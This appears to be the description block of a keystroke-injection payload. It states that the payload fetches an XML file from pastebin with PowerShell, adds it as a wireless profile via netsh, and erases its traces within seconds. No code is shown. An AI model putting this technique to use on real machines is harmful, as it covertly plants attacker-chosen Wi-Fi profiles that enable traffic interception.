* Description: Downloads an xml file from pastebin (using Mubix' powershell code) and the adds it to the wireless profiles using netsh. I used pastebin to keep the script small and quick. Cleans up afterwards - overall takes about 6-7 seconds.
* Options: You might want to change the name of the access point, but you'll need to upload your own xml. The delay after the powershell command might also need to be tweaked.
